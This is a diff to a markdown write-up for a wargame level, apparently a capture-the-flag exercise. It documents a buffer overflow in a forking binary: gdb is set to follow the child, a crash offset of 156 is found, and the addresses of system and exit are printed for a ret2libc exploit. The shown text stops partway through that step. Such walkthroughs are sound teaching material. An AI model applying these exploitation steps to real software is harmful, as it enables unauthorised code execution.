@@ -1,6 +1,9 @@
+# Level 04
+
 So we can see that there is a fixed buffer that will take the input requested for the shell. If we give it input in a certain constrain, probably while we are stil in the stack of the memory, it exists norally, otherwise it halts and stops.
-In gdb we can follow the as well the child process using `set follow-fork-mode child` and using our patern generator we can check at what offset is crashes
-```
+In gdb we can follow the as well the child process using `set follow-fork-mode child` and using our patern generator we can check at what offset is crashes.
+
+```c
 (gdb) set follow-fork-mode child
 (gdb) run
 Starting program: /home/users/level04/level04 
@@ -31,9 +34,11 @@ gs             0x63	99
 (gdb) p (char[4]) 0x41326641
 $2 = "Af2A"
 ```
+
 Our offset is at 156
-Now using the ret2libc explloit we can maybe pop a shell
-```
+Now using the `ret2libc` exploit to pop a shell.
+
+```c
 (gdb) p system
 $3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 (gdb) p exit
